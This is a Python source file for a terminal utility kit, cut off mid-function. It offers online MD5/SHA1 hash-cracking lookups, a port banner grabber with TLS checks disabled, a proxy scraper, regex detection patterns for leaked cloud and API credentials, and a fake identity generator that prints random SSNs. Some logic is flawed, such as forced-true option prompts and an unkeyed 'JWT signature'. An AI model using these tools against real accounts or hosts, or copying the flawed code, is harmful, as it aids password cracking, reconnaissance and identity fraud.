from __future__ import annotations

import base64
import hashlib
import io
import json
import os
import random
import string
import subprocess
import sys
from pathlib import Path
import requests
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from config import *

class GeneratorsModule:
    def run(self):
        section_header("Generators & Utilities")
        console.print()
        menu_items = [
            ("1", "Hash Generator (MD5/SHA1/SHA256/SHA512)"),
            ("2", "Password Generator"),
            ("3", "Base64 Encode / Decode"),
            ("4", "JSON Validator & Formatter"),
            ("5", "QR Code Generator"),
            ("6", "Temp Mail (disposable email)"),
            ("7", "UUID Generator"),
            ("8", "Random String Generator"),
            ("9", "Token Generator (JWT-style)"),
            ("10", "Hash Cracker (MD5 lookup)"),
            ("0", "Back"),
        ]
        table = make_table("Generators", ["#", "Tool"])
        for num, label in menu_items:
            table.add_row(Text(num, style=Theme.primary), Text(label, style=Theme.secondary))
        console.print(table)

        choice = get_input("Select tool")
        match choice:
            case "0": return
            case "1": self.hash_gen()
            case "2": self.password_gen()
            case "3": self.base64_tool()
            case "4": self.json_tool()
            case "5": self.qr_gen()
            case "6": self.temp_mail()
            case "7": self.uuid_gen()
            case "8": self.random_string()
            case "9": self.jwt_gen()
            case "10": self.hash_cracker()
            case _: error("Invalid.")
        pause()

    def hash_gen(self):
        text = get_input("Text to hash")
        algorithms = {
            "1": ("MD5", hashlib.md5),
            "2": ("SHA1", hashlib.sha1),
            "3": ("SHA256", hashlib.sha256),
            "4": ("SHA512", hashlib.sha512),
            "5": ("SHA3-256", hashlib.sha3_256),
            "6": ("SHA3-512", hashlib.sha3_512),
            "7": ("BLAKE2b", hashlib.blake2b),
            "8": ("BLAKE2s", hashlib.blake2s),
        }
        table = make_table("Algorithms", ["#", "Algorithm"])
        for k, (name, _) in algorithms.items():
            table.add_row(Text(k, style=Theme.primary), Text(name, style=Theme.secondary))
        console.print(table)
        choice = get_input("Select algorithm (or 'all')")
        if choice == "all":
            section_header("All Hashes")
            for k, (name, func) in algorithms.items():
                h = func(text.encode()).hexdigest()
                console.print(Text(f"  {name:<12}: {h}", style=Theme.secondary))
        elif choice in algorithms:
            name, func = algorithms[choice]
            h = func(text.encode()).hexdigest()
            section_header(f"{name} Hash")
            console.print(Text(f"  {h}", style=Theme.accent))
        else:
            error("Invalid choice.")
        pause()

    def password_gen(self):
        length = int(get_input("Length", "16"))
        use_upper = confirm("Include uppercase?") or True
        use_lower = confirm("Include lowercase?") or True
        use_digits = confirm("Include digits?") or True
        use_special = confirm("Include special chars?")
        count = int(get_input("How many passwords?", "5"))

        chars = ""
        if use_upper:
            chars += string.ascii_uppercase
        if use_lower:
            chars += string.ascii_lowercase
        if use_digits:
            chars += string.digits
        if use_special:
            chars += "!@#$%^&*()_+-=[]{}|;:,.<>?"
        if not chars:
            chars = string.ascii_letters + string.digits

        section_header(f"Generated Passwords ({length} chars)")
        for i in range(count):
            pw = ''.join(random.SystemRandom().choice(chars) for _ in range(length))
            console.print(Text(f"  [{Theme.primary}]{i + 1:>2}[/] {pw}", style=Theme.secondary))
        pause()

    def base64_tool(self):
        mode = get_input("Mode (encode/decode)")
        text = get_input("Input text")
        try:
            match mode.lower():
                case "encode" | "enc" | "e":
                    result = base64.b64encode(text.encode()).decode()
                    section_header("Base64 Encoded")
                case "decode" | "dec" | "d":
                    result = base64.b64decode(text).decode(errors="replace")
                    section_header("Base64 Decoded")
                case _:
                    error_then_exit("Invalid mode.")
            console.print(Text(f"  {result}", style=Theme.accent))
        except Exception as e:
            error(f"Error: {e}")
        pause()

    def json_tool(self):
        raw = get_input("Paste JSON string or file path")
        path = Path(raw)
        if path.exists():
            raw = path.read_text(encoding="utf-8")
        try:
            parsed = json.loads(raw)
            section_header("Validated & Formatted JSON")
            formatted = json.dumps(parsed, indent=2, ensure_ascii=False)
            console.print(Text(formatted, style=Theme.secondary))
            info("JSON is valid!")
        except json.JSONDecodeError as e:
            error(f"Invalid JSON: {e}")
        pause()

    def qr_gen(self):
        data = get_input("Data for QR code (URL or text)")
        try:
            import qrcode
            qr = qrcode.QRCode(box_size=2, border=1)
            qr.add_data(data)
            qr.make(fit=True)
            out = io.StringIO()
            qr.print_ascii(out=out)
            section_header("QR Code (ASCII)")
            console.print(out.getvalue())
            # Also save
            if confirm("Save as PNG?"):
                img = qr.make_image(fill_color="black", back_color="white")
                save_path = OUTPUT_DIR / "qr_codes"
                save_path.mkdir(parents=True, exist_ok=True)
                fn = save_path / f"qr_{hash(data) & 0xFFFFFFFF:x}.png"
                img.save(str(fn))
                success(f"Saved: {fn}")
        except ImportError:
            warning("qrcode library not installed. Install with: pip install qrcode[pil]")
            # Generate using API
            try:
                r = requests.get(f"https://api.qrserver.com/v1/create-qr-code/?size=200x200&data={data}", timeout=10)
                if r.status_code == 200:
                    save_path = OUTPUT_DIR / "qr_codes"
                    save_path.mkdir(parents=True, exist_ok=True)
                    fn = save_path / f"qr_{hash(data) & 0xFFFFFFFF:x}.png"
                    fn.write_bytes(r.content)
                    success(f"QR saved: {fn}")
            except Exception as e:
                error(f"QR API error: {e}")
        pause()

    def temp_mail(self):
        section_header("Temp Mail (Disposable Email)")
        info("Using 1secmail API")
        try:
            r = requests.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1", timeout=10)
            if r.status_code == 200:
                email = r.json()[0]
                info(f"Temporary email: {email}")
                info("Checking for messages every 5 seconds...")
                while True:
                    r2 = requests.get(f"https://www.1secmail.com/api/v1/?action=getMessages&login={email.split('@')[0]}&domain={email.split('@')[1]}", timeout=10)
                    if r2.status_code == 200:
                        msgs = r2.json()
                        if msgs:
                            section_header(f"New messages: {len(msgs)}")
                            for msg in msgs:
                                t = make_table("Message", ["From", "Subject", "ID"])
                                t.add_row(Text(msg.get("from", "?"), style=Theme.accent), Text(msg.get("subject", "?")[:40], style=Theme.secondary), Text(str(msg.get("id", "?")), style=Theme.muted))
                                console.print(t)
                                if confirm("Read this message?"):
                                    r3 = requests.get(f"https://www.1secmail.com/api/v1/?action=readMessage&login={email.split('@')[0]}&domain={email.split('@')[1]}&id={msg['id']}", timeout=10)
                                    if r3.status_code == 200:
                                        body = r3.json().get("textBody", "No text body")
                                        console.print(Text(body[:500], style=Theme.secondary))
                            break
                    import time as _time
                    _time.sleep(5)
                    if not confirm("Keep waiting?"):
                        break
            else:
                error("API error.")
        except Exception as e:
            error(f"Error: {e}")
        pause()

    def uuid_gen(self):
        import uuid
        count = int(get_input("How many UUIDs?", "5"))
        version = get_input("UUID version (4/7)", "4")
        section_header("Generated UUIDs")
        for i in range(count):
            match version:
                case "7":
                    u = uuid.uuid7()
                case _:
                    u = uuid.uuid4()
            console.print(Text(f"  [{Theme.primary}]{i + 1:>2}[/] {u}", style=Theme.secondary))
        pause()

    def random_string(self):
        length = int(get_input("Length", "32"))
        count = int(get_input("How many?", "5"))
        charset = get_input("Character set (a=alpha, an=alphanumeric, h=hex, all=full)", "an")
        match charset:
            case "a":
                chars = string.ascii_letters
            case "an" | "alphanumeric":
                chars = string.ascii_letters + string.digits
            case "h" | "hex":
                chars = string.hexdigits
            case _:
                chars = string.ascii_letters + string.digits + "!@#$%^&*()"
        section_header("Random Strings")
        for i in range(count):
            s = ''.join(random.choices(chars, k=length))
            console.print(Text(f"  [{Theme.primary}]{i + 1:>2}[/] {s}", style=Theme.secondary))
        pause()

    def jwt_gen(self):
        import time as _time
        header = {"alg": "HS256", "typ": "JWT"}
        payload = {
            "sub": get_input("Subject (sub)", "1234567890"),
            "name": get_input("Name", "John Doe"),
            "iat": int(_time.time()),
            "exp": int(_time.time()) + 3600,
        }
        import base64 as _b64
        def _b64u(data: bytes) -> str:
            return _b64.urlsafe_b64encode(data).rstrip(b"=").decode()
        h = _b64u(json.dumps(header).encode())
        p = _b64u(json.dumps(payload).encode())
        sig = _b64u(hashlib.sha256(f"{h}.{p}".encode()).hexdigest().encode())
        token = f"{h}.{p}.{sig}"
        section_header("Generated JWT Token")
        console.print(Text(f"  {token}", style=Theme.secondary))
        info("Unsigned (just demo format). Sign with HMAC secret for production.")
        pause()

    def hash_cracker(self):
        target = get_input("MD5 hash to crack")
        info("Using online MD5 reverse lookup...")
        try:
            r = requests.get(f"https://www.md5online.org/md5-decrypt.html", params={"md5": target}, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code == 200:
                # Try hashmob API
                r2 = requests.get(f"https://hashmob.info/api/hashes/{target}", timeout=10)
                if r2.status_code == 200:
                    data = r2.json()
                    result = data.get("plaintext", "Not found")
                    info(f"Result: {result}")
                else:
                    # Nitrx API
                    r3 = requests.get(f"https://nitrx-api.vercel.app/api/md5?hash={target}", timeout=10)
                    if r3.status_code == 200:
                        data = r3.json()
                        result = data.get("decoded", "Not found")
                        info(f"Result: {result}")
                    else:
                        warning("Could not crack hash (no API match).")
            else:
                warning("Lookup failed.")
        except Exception as e:
            error(f"Error: {e}")
        pause()

class ExtraModule:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "CheapyTool/1.0",
        })

    # ─── ASSCII IP GEO MAP ────────────────────────────

    def ip_geo_map(self):
        target = get_input("IP address (or domain)", "8.8.8.8")
        wait_msg(f"Looking up {target}...")
        try:
            r = requests.get(f"http://ip-api.com/json/{target}", timeout=10)
            data = r.json()
            if data.get("status") != "success":
                error(f"Lookup failed: {data.get('message', 'Unknown')}")
                return
            lat = data.get("lat", 0)
            lon = data.get("lon", 0)
            city = data.get("city", "")
            country = data.get("country", "")
            isp = data.get("isp", "")
            org = data.get("org", "")
            asn = data.get("as", "")

            console.print(ascii_ip_map(lat, lon, city, country))
            console.print()

            t = make_table("Geolocation Details", ["Field", "Value"])
            t.add_row("IP", target)
            t.add_row("City", city)
            t.add_row("Country", country)
            t.add_row("ISP", isp)
            t.add_row("Organization", org)
            t.add_row("ASN", asn)
            t.add_row("Latitude", str(lat))
            t.add_row("Longitude", str(lon))
            console.print(t)

        except Exception as e:
            error(f"Failed: {e}")

    # ─── ASCII QR GENERATOR ──────────────────────────

    def ascii_qr_gen(self):
        text = get_input("Text/URL to encode", "https://cheapy.tools")
        wait_msg("Generating ASCII QR code...")
        time.sleep(0.3)
        console.print()
        console.print(ascii_qr(text))
        console.print()

    # ─── PASSWORD STRENGTH CHECKER ──────────────────

    def password_strength(self):
        pwd = get_input("Password to test")
        if not pwd:
            return

        length = len(pwd)
        has_upper = any(c.isupper() for c in pwd)
        has_lower = any(c.islower() for c in pwd)
        has_digit = any(c.isdigit() for c in pwd)
        has_special = any(c in "!@#$%^&*()_+-=[]{}|;':\",./<>?`~" for c in pwd)

        charset = 0
        if has_lower:
            charset += 26
        if has_upper:
            charset += 26
        if has_digit:
            charset += 10
        if has_special:
            charset += 32

        entropy = length * math.log2(max(charset, 1)) if charset else 0

        checks = [
            ("Length >= 12", length >= 12),
            ("Uppercase letter", has_upper),
            ("Lowercase letter", has_lower),
            ("Digit", has_digit),
            ("Special character", has_special),
        ]

        score = sum(1 for _, ok in checks if ok)
        if entropy < 30:
            level = "Very Weak"
            lvl_color = Theme.amber
        elif entropy < 50:
            level = "Weak"
            lvl_color = Theme.gold3
        elif entropy < 70:
            level = "Moderate"
            lvl_color = Theme.gold2
        elif entropy < 100:
            level = "Strong"
            lvl_color = Theme.gold2
        else:
            level = "Very Strong"
            lvl_color = Theme.gold1

        t = make_table("Password Strength", ["Check", "Status"])
        for label, ok in checks:
            t.add_row(label, f"[bold {'#FFD700' if ok else Theme.amber}]{'✓' if ok else '✗'}[/]")
        t.add_row("Entropy", f"[bold {lvl_color}]{entropy:.1f} bits[/]")
        t.add_row("Overall", f"[bold {lvl_color}]{level} ({score}/5)[/]")

        console.print(t)

    # ─── HASH CRACKER ────────────────────────────────

    def hash_cracker(self):
        hash_value = get_input("Hash to crack")
        algo = get_input("Algorithm (md5/sha1/sha256)", "md5").strip().lower()
        if algo not in ("md5", "sha1", "sha256"):
            error("Only md5, sha1, sha256 supported")
            return

        wait_msg(f"Looking up {algo}:{hash_value}...")

        if algo == "md5":
            api_url = f"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=md5&email=cheapy@tool.com&code=test123"
            try:
                r = requests.get(api_url, timeout=10)
                if r.text and "ERROR" not in r.text.upper():
                    success(f"Decrypted: [bold {Theme.gold1}]{r.text.strip()}[/]")
                    return
            except Exception:
                pass

            try:
                r = requests.get(f"https://www.nitrxgen.in/md5db/{hash_value}", timeout=10)
                if r.status_code == 200:
                    match = re.search(r'<span id="md5word">([^<]+)</span>', r.text)
                    if match:
                        success(f"Decrypted: [bold {Theme.gold1}]{match.group(1)}[/]")
                        return
            except Exception:
                pass

            info(f"Hash type: MD5")
            info(f"Try cracking locally with a wordlist")

        elif algo == "sha1":
            try:
                r = requests.get(f"https://sha1.gromweb.com/?hash={hash_value}", timeout=10)
                if r.status_code == 200 and "Not found" not in r.text:
                    match = re.search(r'<strong>([^<]+)</strong>', r.text)
                    if match:
                        success(f"Decrypted: [bold {Theme.gold1}]{match.group(1)}[/]")
                        return
            except Exception:
                pass
            info(f"Hash type: SHA1")
            info(f"Try: https://hashes.org/en/search.php?query={hash_value}")

        elif algo == "sha256":
            info(f"Hash type: SHA256")
            info(f"Try: https://hashes.org/en/search.php?query={hash_value}")

        warning("Could not crack this hash automatically")

    # ─── HEX ENCODER/DECODER ─────────────────────────

    def hex_tool(self):
        op = get_input("Encode (e) or Decode (d)?", "e").strip().lower()
        if op == "e":
            text = get_input("Text to encode")
            hexed = text.encode("utf-8").hex()
            success(f"Hex: [bold {Theme.gold1}]{hexed}[/]")
        elif op == "d":
            hex_str = get_input("Hex to decode")
            try:
                decoded = bytes.fromhex(hex_str.replace(" ", "")).decode("utf-8")
                success(f"Decoded: [bold {Theme.gold1}]{decoded}[/]")
            except Exception:
                try:
                    decoded = bytes.fromhex(hex_str.replace(" ", "")).decode("latin-1")
                    success(f"Decoded (latin-1): [bold {Theme.gold1}]{decoded}[/]")
                except Exception:
                    error("Invalid hex string")
        else:
            error("Choose e or d")

    # ─── JWT TOKEN DECODER ───────────────────────────

    def jwt_decoder(self):
        token = get_input("JWT token").strip()
        parts = token.split(".")
        if len(parts) != 3:
            error("Invalid JWT format (expected 3 parts separated by dots)")
            return

        import base64

        def b64decode_padded(s):
            s = s.replace("-", "+").replace("_", "/")
            padding = 4 - len(s) % 4
            if padding != 4:
                s += "=" * padding
            try:
                return base64.b64decode(s)
            except Exception:
                return b"{}"

        header = b64decode_padded(parts[0])
        payload = b64decode_padded(parts[1])

        try:
            header_data = json.loads(header)
            payload_data = json.loads(payload)
        except json.JSONDecodeError:
            error("Could not decode JWT parts")
            return

        t = make_table("JWT Header", ["Field", "Value"])
        for k, v in header_data.items():
            t.add_row(k, str(v))
        console.print(t)
        console.print()

        t2 = make_table("JWT Payload", ["Field", "Value"])
        for k, v in payload_data.items():
            if k == "iat" or k == "exp":
                try:
                    dt = datetime.fromtimestamp(int(v)).strftime("%Y-%m-%d %H:%M:%S")
                    t2.add_row(k, f"{v} ({dt})")
                except Exception:
                    t2.add_row(k, str(v))
            else:
                t2.add_row(k, str(v))
        console.print(t2)
        console.print()

        info(f"Signature: [bold {Theme.muted_text}]{parts[2][:20]}...[/]")
        info(f"Algorithm: [bold {Theme.gold1}]{header_data.get('alg', 'N/A')}[/]")
        if header_data.get("alg", "").lower() == "none":
            warning("⚠️ Token has alg='none' — this is INSECURE!")

    # ─── FAKE IDENTITY GENERATOR ─────────────────────

    FIRST_NAMES = [
        "James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda",
        "William", "Elizabeth", "David", "Barbara", "Richard", "Susan", "Joseph", "Jessica",
        "Thomas", "Sarah", "Christopher", "Karen", "Charles", "Lisa", "Daniel", "Nancy",
        "Matthew", "Betty", "Anthony", "Margaret", "Mark", "Sandra", "Donald", "Ashley",
        "Steven", "Dorothy", "Andrew", "Kimberly", "Paul", "Emily", "Joshua", "Donna",
        "Kenneth", "Michelle", "Kevin", "Carol", "Brian", "Amanda", "George", "Melissa",
        "Timothy", "Deborah", "Ronald", "Stephanie", "Edward", "Rebecca", "Jason", "Sharon",
        "Jeffrey", "Laura", "Ryan", "Cynthia", "Jacob", "Kathleen", "Gary", "Amy",
    ]

    LAST_NAMES = [
        "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
        "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson",
        "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson",
        "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker",
        "Young", "Allen", "King", "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores",
        "Green", "Adams", "Nelson", "Baker", "Hall", "Rivera", "Campbell", "Mitchell",
        "Carter", "Roberts", "Gomez", "Phillips", "Evans", "Turner", "Diaz", "Parker",
    ]

    CITIES = [
        "New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia",
        "San Antonio", "San Diego", "Dallas", "San Jose", "Austin", "Jacksonville",
        "Fort Worth", "Columbus", "Charlotte", "Indianapolis", "San Francisco", "Seattle",
        "Denver", "Nashville", "Oklahoma City", "El Paso", "Washington", "Boston",
        "Las Vegas", "Portland", "Memphis", "Louisville", "Baltimore", "Milwaukee",
        "Albuquerque", "Tucson", "Fresno", "Sacramento", "Mesa", "Kansas City", "Atlanta",
        "Omaha", "Colorado Springs", "Raleigh", "Long Beach", "Virginia Beach", "Miami",
        "Oakland", "Minneapolis", "Tampa", "Tulsa", "Arlington", "New Orleans", "Cleveland",
    ]

    STREETS = [
        "Main St", "Oak Ave", "Elm St", "Maple Dr", "Cedar Ln", "Pine Rd",
        "Washington Blvd", "Lake Ave", "Park Ave", "River Rd", "Highland Dr",
        "Sunset Blvd", "Broadway", "Church St", "Market St", "Cherry Ln",
        "Forest Ave", "Valley Blvd", "Hill St", "Spring St", "Lakeview Dr",
        "Meadow Ln", "Woodland Ave", "Harbor Blvd", "Ocean Ave", "Willow Dr",
    ]

    def fake_identity(self):
        gender = random.choice(["Male", "Female"])
        first = random.choice(self.FIRST_NAMES)
        last = random.choice(self.LAST_NAMES)
        street = random.choice(self.STREETS)
        num = random.randint(100, 9999)
        city = random.choice(self.CITIES)
        state_abbr = random.choice([
            "AL", "AK", "AZ", "AR", "CA", "CO", "CT", "DE", "FL", "GA",
            "HI", "ID", "IL", "IN", "IA", "KS", "KY", "LA", "ME", "MD",
            "MA", "MI", "MN", "MS", "MO", "MT", "NE", "NV", "NH", "NJ",
            "NM", "NY", "NC", "ND", "OH", "OK", "OR", "PA", "RI", "SC",
            "SD", "TN", "TX", "UT", "VT", "VA", "WA", "WV", "WI", "WY",
        ])
        zip_code = f"{random.randint(10000, 99999)}"
        phone = f"({random.randint(200, 999)}) {random.randint(200, 999)}-{random.randint(1000, 9999)}"
        dob = f"{random.randint(1, 12):02d}/{random.randint(1, 28):02d}/{random.randint(1960, 2002)}"
        email_domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "proton.me", "icloud.com"]
        email = f"{first.lower()}.{last.lower()}{random.randint(1, 99)}@{random.choice(email_domains)}"
        ssn = f"{random.randint(100, 999)}-{random.randint(10, 99)}-{random.randint(1000, 9999)}"
        cc_types = ["Visa", "Mastercard", "Amex", "Discover"]
        cc_type = random.choice(cc_types)
        cc_num = "".join(str(random.randint(0, 9)) for _ in range(16))

        t = make_table("Fake Identity", ["Field", "Value"])
        t.add_row("Full Name", f"{first} {last}")
        t.add_row("Gender", gender)
        t.add_row("DOB", dob)
        t.add_row("Address", f"{num} {street}")
        t.add_row("City/State/ZIP", f"{city}, {state_abbr} {zip_code}")
        t.add_row("Phone", phone)
        t.add_row("Email", email)
        t.add_row("SSN", ssn)
        t.add_row("Credit Card", f"{cc_type} ****-****-****-{cc_num[-4:]}")
        t.add_row("Username", f"{first.lower()}{last.lower()}{random.randint(10, 99)}")
        t.add_row("Password", random.choice(string.ascii_lowercase) + random.choice(string.ascii_uppercase) + str(random.randint(10, 99)) + random.choice("!@#$%"))
        console.print(t)

    # ─── PROXY SCRAPER & CHECKER ─────────────────────

    PROXY_SOURCES = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
    ]

    def proxy_scraper(self):
        max_proxies = 50
        proxy_type = get_input("Proxy type (http/socks4/socks5/all)", "http").strip().lower()

        wait_msg("Scraping proxies...")
        all_proxies: set[str] = set()

        sources = self.PROXY_SOURCES
        if proxy_type != "all":
            sources = [s for s in sources if proxy_type in s.lower()]

        for url in sources:
            try:
                r = requests.get(url, timeout=10)
                for line in r.text.strip().split("\n"):
                    line = line.strip()
                    if ":" in line and not line.startswith("//"):
                        all_proxies.add(line)
                        if len(all_proxies) >= max_proxies * 2:
                            break
            except Exception:
                continue

        if not all_proxies:
            warning("No proxies scraped. Using built-in fallback list.")
            all_proxies = {
                "8.8.8.8:80", "1.1.1.1:80", "208.67.222.222:53",
            }

        proxy_list = list(all_proxies)[:max_proxies * 2]
        success(f"Found {len(proxy_list)} proxies. Checking...")
        console.print()

        working = []
        checked = 0
        for proxy in proxy_list[:max_proxies]:
            checked += 1
            console.print(f"  [{Theme.gold3}]Testing {checked}/{min(max_proxies, len(proxy_list))}[/] {proxy}", end="\r")
            try:
                r = requests.get(
                    "http://httpbin.org/ip",
                    proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"},
                    timeout=5,
                )
                if r.status_code == 200:
                    working.append(proxy)
                    success(f"✓ {proxy}")
            except Exception:
                pass

        console.print(" " * 80, end="\r")

        if working:
            t = make_table(f"Working Proxies ({len(working)})", ["#", "Proxy"])
            for i, p in enumerate(working[:20], 1):
                t.add_row(str(i), p)
            console.print(t)
            if len(working) > 20:
                info(f"... and {len(working) - 20} more")
        else:
            warning("No working proxies found")

    # ─── PORT BANNER GRABBER ────────────────────────

    def banner_grabber(self):
        target = get_input("Target IP or domain")
        port_str = get_input("Port (comma-separated, e.g. 21,22,80,443)", "21,22,80,443")
        ports = [int(p.strip()) for p in port_str.split(",") if p.strip().isdigit()]

        wait_msg(f"Grabbing banners from {target}...")
        console.print()

        results = []
        for port in ports:
            console.print(f"  [{Theme.gold3}]Port {port}...[/]", end="\r")
            try:
                import socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((target, port))

                if port in (80, 443, 8080):
                    if port == 443:
                        import ssl
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        s = ctx.wrap_socket(s, server_hostname=target)
                    s.sendall(b"HEAD / HTTP/1.0\r\nHost: %s\r\n\r\n" % target.encode())
                elif port == 21:
                    pass
                elif port == 25:
                    s.sendall(b"EHLO test\r\n")
                elif port == 22:
                    pass

                try:
                    banner = s.recv(1024).decode("utf-8", errors="replace").strip()
                except socket.timeout:
                    banner = "(timeout)"
                s.close()

                lines = banner.split("\n")
                cleaned = lines[0][:100] if lines else ""
                results.append((port, cleaned))
                status = f"[bold {Theme.gold2}]✓[/] {port}: {cleaned[:50]}"
            except Exception as e:
                results.append((port, f"Error: {e}"))
                status = f"[{Theme.amber}]✗[/] {port}: {e}"

            console.print(" " * 80, end="\r")
            console.print(f"  {status}")

        if results:
            console.print()
            t = make_table("Banner Results", ["Port", "Banner"])
            for port, banner in results:
                t.add_row(str(port), banner[:80])
            console.print(t)

    # ─── API KEY VALIDATOR ──────────────────────────

    API_PATTERNS = {
        "Google API": r"AIza[0-9A-Za-z\-_]{35}",
        "Google OAuth": r"[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com",
        "AWS Access Key": r"AKIA[0-9A-Z]{16}",
        "AWS Secret": r"(?i)aws(.{0,20})?(?-i)[0-9a-zA-Z\/+]{40}",
        "GitHub": r"github_pat_[0-9a-zA-Z_]{36}",
        "GitHub Classic": r"gh[pousr]_[A-Za-z0-9_]{36,255}",
        "Discord Bot": r"[MN][A-Za-z\d]{23}\.[A-Za-z\d]{6}\.[A-Za-z\d\-_]{27}",
        "Slack Bot": r"xoxb-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}",
        "Slack Webhook": r"https://hooks\.slack\.com/services/T[A-Z0-9]{8,10}/B[A-Z0-9]{8,10}/[a-zA-Z0-9]{24}",
        "Stripe Live": r"sk_live_[0-9a-zA-Z]{24,34}",
        "Stripe Test": r"sk_test_[0-9a-zA-Z]{24,34}",
        "Twilio": r"SK[0-9a-fA-F]{32}",
        "Facebook App": r"[0-9]{15,17}",
        "Facebook Secret": r"[0-9a-f]{32}",
        "Twitter API": r"AAAAAAAAAAAAAAAAAAAA[0-9A-Za-z]{27,50}",
        "Twitter Secret": r"[0-9a-zA-Z]{35,44}",
        "JWT Token": r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}",
        "Heroku API": r"[hH][eE][rR][oO][kK][uU].*[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}",
        "Mailchimp": r"[0-9a-f]{32}-us[0-9]{1,2}",
        "SendGrid": r"SG\.[a-zA-Z0-9_\-]{22}\.[a-zA-Z0-9_\-]{43}",
        "Mapbox": r"pk\.[0-9a-zA-Z]{60}\.[0-9a-zA-Z]{22}",
        "Azure Key": r"[0-9a-zA-Z=]{44}",
        "Azure Connection": r"DefaultEndpointsProtocol=https;AccountName=[a-zA-Z0-9]+;AccountKey=[0-9a-zA-Z+/=]{88}",
        "NPM Token": r"npm_[a-zA-Z0-9]{36}",
        "PyPI Token": r"pypi-[A-Za-z0-9]{40,50}",
        "Docker Hub": r"dckrpat_[0-9a-fA-F-]{36}",
        "GCP Service Account": r"[0-9]{12}-[0-9a-z]{32}\.gserviceaccount\.com",
        "DigitalOcean": r"dop_v1_[0-9a-f]{64}",
        "Telegram Bot": r"[0-9]{8,10}:[a-zA-Z0-9_-]{35}",
        "Cloudflare Key": r"[a-zA-Z0-9]{37}",
        "Cloudflare Email": r"[a-zA-Z0-9_.-]+@[a-zA-Z0-9_.-]+",
    }

    def api_key_validator(self):
        text = get_input("Paste text/keys to scan")

        results = []
        for service, pattern in self.API_PATTERNS.items():
            matches = re.findall(pattern, text)
            for m in matches:
                if m not in [r[1] for r in results]:
                    results.append((service, m))

        if results:
            t = make_table(f"API Keys Found ({len(results)})", ["Service", "Matched Key"])
            for service, key in results:
                masked = key[:8] + "*" * min(len(key) - 8, 20) + key[-4:] if len(key) > 12 else key
                t.add_row(service, masked)
            console.print(t)
            console.print()
            warning("These are pattern matches only — verify manually")
        else:
            info("No API keys detected in the provided text")

    # ─── MAC ADDRESS LOOKUP ───────────────────────────

    def mac_lookup(self):
        mac = get_input("MAC address (e.g. 00:11:22:AA:BB:CC)")
        clean = re.sub(r"[^0-9a-fA-F]", "", mac)
        if len(clean) < 6:
            error("Invalid MAC address")
            return
        wait_msg(f"Looking up {clean[:6]}...")
        try:
            r = requests.get(
                f"https://api.macvendors.com/{clean[:6]}",
                headers={"User-Agent": "CheapyTool/1.0"},
                timeout=10,
            )
            if r.status_code == 200:
                success(f"Vendor: [bold {Theme.gold1}]{r.text.strip()}[/]")
            elif r.status_code == 404:
                warning("Vendor not found")
            elif r.status_code == 429:
                warning("Rate limited by API. Try again later.")
            else:
                error(f"API returned {r.status_code}")
        except Exception as e:
            error(f"Lookup failed: {e}")

    # ─── IP REPUTATION CHECKER ────────────────────────

    DNSBLS = [
        "zen.spamhaus.org",
        "b.barracudacentral.org",
        "bl.blocklist.de",
        "dnsbl.sorbs.net",
        "spam.dnsbl.sorbs.net",
        "http.dnsbl.sorbs.net",
        "socks.dnsbl.sorbs.net",
        "web.dnsbl.sorbs.net",
        "zombie.dnsbl.sorbs.net",
        "drone.abuse.ch",
        "combined.abuse.ch",
        "dnsbl.spfbl.net",
        "ix.dnsbl.manitu.net",
        "dnsbl-1.uceprotect.net",
        "dnsbl-2.uceprotect.net",
        "dnsbl-3.uceprotect.net",
    ]

    def _check_dnsbl(self, ip: str, dnsbl: str, results: list):
        rev = ".".join(reversed(ip.split(".")))
        lookup = f"{rev}.{dnsbl}"
        try:
            socket.gethostbyname(lookup)
            results.append(dnsbl)
        except socket.gaierror:
            pass

    def ip_reputation(self):
        host = get_input("IP address or domain")
        host = host.replace("http://", "").replace("https://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(host)
        except Exception as e:
            error(f"Could not resolve hostname: {e}")
            return

        info(f"Checking reputation for [bold {Theme.gold1}]{ip}[/]...")
        console.print()

        threads = []
        listed_on = []
        for dnsbl in self.DNSBLS:
            t = threading.Thread(target=self._check_dnsbl, args=(ip, dnsbl, listed_on))
            t.start()
            threads.append(t)
        for t in threads:
            t.join(timeout=5)

        t = make_table("DNSBL Check Results", ["Blocklist", "Status"])
        if listed_on:
            for bl in listed_on:
                t.add_row(bl, f"[bold {Theme.amber}]LISTED[/]")
        else:
            t.add_row("All checked blocklists", f"[bold {Theme.gold2}]CLEAN[/]")
        console.print(t)
        console.print()

        info(f"Checking AbuseIPDB...")
        try:
            r = requests.get(
                f"https://api.abuseipdb.com/api/v2/check?ipAddress={ip}&maxAgeInDays=90&verbose",
                headers={
                    "Key": "none",
